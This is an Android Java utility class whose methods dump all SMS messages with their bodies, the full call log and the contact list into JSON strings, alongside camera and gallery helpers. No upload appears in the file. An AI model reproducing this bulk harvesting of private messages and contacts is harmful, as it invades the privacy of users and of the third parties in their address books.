package com.queqianme.hpt.utils;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.Button;

import com.ab.util.AbDialogUtil;
import com.ab.util.AbStrUtil;
import com.ab.util.AbToastUtil;
import com.queqianme.hpt.R;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * 手机工具类
 * Created by zhaojiayu on 16/3/4.
 */
public class APPUtils {

    /**
     * 获取短信
     */
    public static String getSms(Context context) {
        final String SMS_URI_ALL = "content://sms/";
        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_SEND = "content://sms/sent";
        final String SMS_URI_DRAFT = "content://sms/draft";

        JSONArray arr = new JSONArray();

        try {
            ContentResolver cr = context.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type", "thread_id", "protocol", "read",
                    "status", "service_center", "sub_id", "date_sent", "seen", "error_code"
                    , "locked", "reply_path_present"};
            Uri uri = Uri.parse(SMS_URI_ALL);
            Cursor cur = cr.query(uri, projection, null, null, "date desc");

            if (cur.moveToFirst()) {
                String name;
                String phoneNumber;
                String smsbody;
                String date;
                String type;
                int _id;
                int thread_id;
                int protocol;
                int read;
                int status;
                int sub_id;
                int date_sent;
                int seen;
                int error_code;
                int locked;
                String service_center;
                int reply_path_present;

                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int _idColumn = cur.getColumnIndex("_id");
                int typeColumn = cur.getColumnIndex("type");
                int thread_idColumn = cur.getColumnIndex("thread_id");
                int protocolColumn = cur.getColumnIndex("protocol");
                int readColumn = cur.getColumnIndex("read");
                int statusColumn = cur.getColumnIndex("status");
                int service_centerColumn = cur.getColumnIndex("service_center");
                int sub_idColumn = cur.getColumnIndex("sub_id");
                int date_sentColumn = cur.getColumnIndex("date_sent");
                int seenColumn = cur.getColumnIndex("seen");
                int error_codeColumn = cur.getColumnIndex("error_code");
                int lockedColumn = cur.getColumnIndex("locked");
                int reply_path_presentColumn = cur.getColumnIndex("reply_path_present");

                do {
                    name = cur.getString(nameColumn);
                    phoneNumber = cur.getString(phoneNumberColumn);
                    smsbody = cur.getString(smsbodyColumn);
                    service_center = cur.getString(service_centerColumn);

                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    date = dateFormat.format(d);

                    reply_path_present = cur.getInt(reply_path_presentColumn);
                    locked = cur.getInt(lockedColumn);
                    error_code = cur.getInt(error_codeColumn);
                    seen = cur.getInt(seenColumn);
                    date_sent = cur.getInt(date_sentColumn);
                    sub_id = cur.getInt(sub_idColumn);
                    status = cur.getInt(statusColumn);
                    _id = cur.getInt(_idColumn);
                    thread_id = cur.getInt(thread_idColumn);
                    protocol = cur.getInt(protocolColumn);
                    read = cur.getInt(readColumn);
                    int typeId = cur.getInt(typeColumn);
                    if (typeId == 1) {
                        type = "接收";
                    } else if (typeId == 2) {
                        type = "发送";
                    } else {
                        type = "";
                    }

                    JSONObject object = new JSONObject();
                    try {
                        object.put("person", name);
                        object.put("address", phoneNumber);
                        object.put("body", smsbody);
                        object.put("date", date);
                        object.put("type", type);
                        object.put("service_center", service_center);
                        object.put("protocol", protocol);
                        object.put("sub_id", sub_id);
                        object.put("status", status);
                        object.put("error_code", error_code);
                        object.put("date_sent", date_sent);
                        object.put("seen", seen);
                        object.put("read", read);
                        object.put("locked", locked);
                        object.put("thread_id", thread_id);
                        object.put("reply_path_present", reply_path_present);
                        arr.put(object);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    if (smsbody == null) smsbody = "";
                } while (cur.moveToNext());
            }

        } catch (SQLiteException ex) {
            ex.printStackTrace();
        }
        return arr.toString();
    }

    /**
     * 获取通话记录
     */
    public static String getCall(Context context) {
        String list = null;
        JSONArray allarr = new JSONArray();
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return null;
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if(cursor.moveToFirst()){
            do{
                //  CallsLog calls =new CallsLog();
                //号码
                JSONArray arr=  new JSONArray();
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                //呼叫类型
                String type;
                switch (Integer.parseInt(cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)))) {
                    case CallLog.Calls.INCOMING_TYPE:
                        type = "呼入";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "呼出";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        type = "未接";
                        break;
                    default:
                        type = "挂断";//应该是挂断.根据我手机类型判断出的
                        break;
                }
                SimpleDateFormat sfd = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                Date date = new Date(Long.parseLong(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))));
                //呼叫时间
                String time = sfd.format(date);
                //联系人
                String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                //通话时间,单位:s
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                String cachedNumberLabel = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_LABEL));
                String cachedNumberType = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_TYPE));
                String news = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NEW));

                arr.put(name);
                arr.put(number);
                arr.put(type);
                arr.put(duration);
                arr.put(time);
                arr.put(cachedNumberLabel);
                arr.put(cachedNumberType);
                allarr.put(arr);
                allarr.put(news);
            }while(cursor.moveToNext());

        }

        list=allarr.toString();
        return list;

    }

    /**
     * 获取电话薄
     */
    public static JSONArray getTelbook(Context context) {
        ContentResolver resolver = ((Activity) context).getContentResolver();
        JSONArray phoneNoteArray = new JSONArray();
        try {
            // 获取手机联系人
            Cursor phoneCursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, Config.PHONES_PROJECTION, null, null, null);
            if (phoneCursor != null) {
                while (phoneCursor.moveToNext()) {
                    // 得到手机号码
                    String phoneNumber = phoneCursor.getString(Config.PHONES_NUMBER_INDEX);
                    // 当手机号码为空的或者为空字段 跳过当前循环
                    if (TextUtils.isEmpty(phoneNumber))
                        continue;
                    // 得到联系人名称
                    String contactName = phoneCursor.getString(Config.PHONES_DISPLAY_NAME_INDEX);
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("num", phoneNumber);
                    jsonObject.put("name", contactName);
                    phoneNoteArray.put(jsonObject);
                }
                phoneCursor.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return phoneNoteArray;
    }

    /**
     * 获取GPS位置信息
     */
    public static String getGPS(Context context) {
        return null;
    }


    /**
     * 使用系统当前日期加以调整作为照片的名称
     */
    public static String getPhotoFileName() {
        Date date = new Date(System.currentTimeMillis());
        SimpleDateFormat dateFormat = new SimpleDateFormat("'IMG'_yyyyMMdd_HHmmss");
        return dateFormat.format(date) + ".jpg";
    }

    public static View chooseView;

    /**
     * 拍照弹窗
     */
    public static void getPicture(final Context context) {
        chooseView = LayoutInflater.from(context).inflate(R.layout.dialog_camera, null);
        AbDialogUtil.showDialog(chooseView, Gravity.BOTTOM);
        Button camera = (Button) chooseView.findViewById(R.id.choose_cam);
        Button gallery = (Button) chooseView.findViewById(R.id.choose_album);
        Button cancel = (Button) chooseView.findViewById(R.id.choose_cancel);
        camera.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                AbDialogUtil.removeDialog(context);
                String status = Environment.getExternalStorageState();
                //判断是否有SD卡,如果有sd卡存入sd卡在说，没有sd卡直接转换为图片
                if (status.equals(Environment.MEDIA_MOUNTED)) {
                    //相机
                    Intent cameraintent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE, null);
                    cameraintent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(Config.tempFile));
                    ((Activity) context).startActivityForResult(cameraintent, Config.PHOTO_REQUEST_TAKEPHOTO);
                } else {
                    AbToastUtil.showToast(context, "没有可用的存储卡");
                }
            }
        });
        gallery.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //相册
                Intent intent = new Intent(Intent.ACTION_PICK, MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                intent.setDataAndType(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/*");
                intent.setData(MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                ((Activity) context).startActivityForResult(intent, Config.PHOTO_REQUEST_GALLERY);
            }
        });
        cancel.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //取消
                AbDialogUtil.removeDialog(chooseView);
            }
        });
    }


    /**
     * 从相册得到的url转换为SD卡中图片路径
     */
    public static String getPath(Uri uri, Context context) {
        if (AbStrUtil.isEmpty(uri.getAuthority())) {
            return null;
        }
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = ((Activity) context).managedQuery(uri, projection, null, null, null);
        int column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
        cursor.moveToFirst();
        String path = cursor.getString(column_index);
        return path;
    }

}
